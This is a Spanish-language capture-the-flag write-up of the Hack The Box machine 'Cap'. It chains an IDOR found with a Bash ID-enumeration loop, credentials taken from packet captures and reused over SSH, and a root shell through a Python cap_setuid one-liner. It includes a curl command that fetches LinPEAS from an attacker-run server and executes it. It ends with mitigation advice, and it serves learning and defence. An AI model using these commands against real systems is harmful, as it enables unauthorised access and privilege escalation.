---
title: "CAP - Hack The Box"
description: "Máquina Linux Easy de HTB: IDOR, credenciales expuestas y escalada de privilegios mediante capabilities."
date: 2026-10-10 22:00:00 -0300
categories: [Writeups]
tags: [htb, linux, cap, idor, privilege-escalation]
pin: false
math: false
mermaid: false
---

## Resumen

`Enumeración web → IDOR → Credenciales expuestas → Acceso por SSH → LinPEAS → Abuso de cap_setuid en Python → Escalada a root → Pwned`

| Dato | Valor |
| --- | --- |
| Plataforma | HTB |
| Sistema operativo | Linux |
| Dificultad | Easy |

## Reconocimiento

Comenzamos con un escaneo general de puertos para identificar los servicios expuestos en la máquina objetivo.

```bash
nmap -p- --min-rate 5000 -sS -n -Pn <IP> -oN generalscan
```

Identificamos tres puertos abiertos: 21 (FTP), 22 (SSH) y 80 (HTTP). Para obtener información más detallada sobre los servicios y sus versiones, realizamos un segundo escaneo:

```bash
nmap -p21,22,80 -sCV <IP> -oN openports
```

Al ingresar al servicio web, encontramos un panel con distintas secciones, incluida una que permite consultar capturas de tráfico de red. La URL presenta el siguiente formato:

```text
http://<IP>/data/1
```

El identificador numérico nos lleva a comprobar si es posible acceder a otras capturas modificando directamente el valor de la URL.


## Enumeración

Para automatizar la búsqueda de identificadores válidos, utilizamos un script Bash que recorre los valores del 0 al 9999 y filtra las respuestas HTTP con código `200 OK`.

```bash
#!/usr/bin/env bash

for i in $(seq 0 9999); do
    codigo=$(curl -s -o /dev/null -w "%{http_code}" "http://<IP>/data/$i")

    if [ "$codigo" -eq 200 ]; then
        echo "200 -> http://<IP>/data/$i"
    fi
done
```

> Durante este proceso, inicialmente no obtenía resultados al enumerar esta sección. Tuve que reiniciar la máquina para que respondiera con normalidad.
{: .prompt-info }

Los resultados permiten acceder a los identificadores 0 y 1. Al inspeccionar las capturas, encontramos credenciales FTP expuestas en el tráfico.

Este comportamiento evidencia una vulnerabilidad de tipo IDOR (*Insecure Direct Object Reference*), ya que es posible acceder a recursos mediante identificadores manipulables sin que la aplicación aplique correctamente los controles de autorización.

## Acceso inicial

Con las credenciales obtenidas, comprobamos su validez en los servicios expuestos. Aunque corresponden a FTP, también permiten autenticarnos mediante SSH, evidenciando una reutilización de credenciales.

```bash
ssh nathan@<VictimIP>
```
>Cuando se obtienen credenciales válidas, es recomendable comprobar si pueden utilizarse para autenticarse en otros servicios disponibles en el entorno, debido a que la reutilización de credenciales es una práctica habitual que puede permitir el acceso a recursos adicionales.
{: .prompt-tip }

De esta forma obtenemos acceso al sistema como `nathan` y conseguimos nuestra primera flag.

## Escalada de privilegios

Una vez dentro, revisamos los grupos del usuario, los permisos de `sudo` y las tareas programadas en `cron`, sin encontrar una vía de escalada evidente.

Para ampliar la enumeración, utilizamos LinPEAS, una herramienta que permite identificar posibles configuraciones inseguras y vectores de escalada de privilegios.

Desde nuestra máquina atacante, iniciamos un servidor HTTP en el directorio donde se encuentra el script:

```bash
python3 -m http.server 8000
```

Desde la máquina víctima, descargamos y ejecutamos LinPEAS:

```bash
curl http://<IP-atacante>:8000/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Durante el análisis identificamos que python dispone de la capability `cap_setuid`. Podemos comprobarlo mediante:

```bash
getcap -r / 2>/dev/null
```

Esta capability permite a un proceso modificar sus identificadores de usuario. Esto puede permitir que un usuario sin privilegios obtenga una shell como `root`.

En este escenario, aprovechamos esta configuración mediante el siguiente comando:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

El comando intenta establecer el UID del proceso en `0` y, si tiene éxito, ejecuta una shell de Bash con esos privilegios.

Finalmente, verificamos el resultado:

```bash
id
whoami
```

Si la salida confirma que somos `root`, hemos completado la escalada de privilegios y podemos acceder a la flag correspondiente.

## Lecciones aprendidas y mitigación

La máquina CAP demuestra cómo una vulnerabilidad web, la exposición de credenciales y una configuración insegura de privilegios pueden encadenarse hasta comprometer completamente un sistema.

### IDOR y control de acceso

**Problema:** la aplicación permite consultar capturas de otros usuarios mediante la modificación de identificadores en la URL.

**Mitigación:**
- Antes de devolver cualquier recurso, el backend debe verificar que el usuario autenticado sea el propietario (o tenga permiso explícito) sobre ese id específico, y no solo que esté autenticado en general
- Sustituir los IDs secuenciales por identificadores no enumerables, como UUIDv4.Esto no corrige el fallo de autorización por sí solo, pero elimina la posibilidad de enumerar recursos por fuerza bruta como se hizo en la fase de reconocimiento.
- Limitar la cantidad de solicitudes por IP/usuario a endpoints que reciben identificadores, y generar alertas ante patrones de escaneo secuencial (como el script que recorrió 0-9999)

### Exposición de credenciales

**Problema:** las capturas contienen credenciales recuperables que permiten acceder a otros servicios mediante la reutilización de contraseñas.

**Mitigación:** Migrar FTP a un protocolo cifrado (SFTP/FTPS).

### Capabilities inseguras en Linux

**Problema:** la asignación de `cap_setuid` a Python permite modificar el UID del proceso y puede facilitar una escalada a `root`.

**Mitigación:** Eliminar capabilities innecesarias y aplicar el principio de mínimo privilegio.


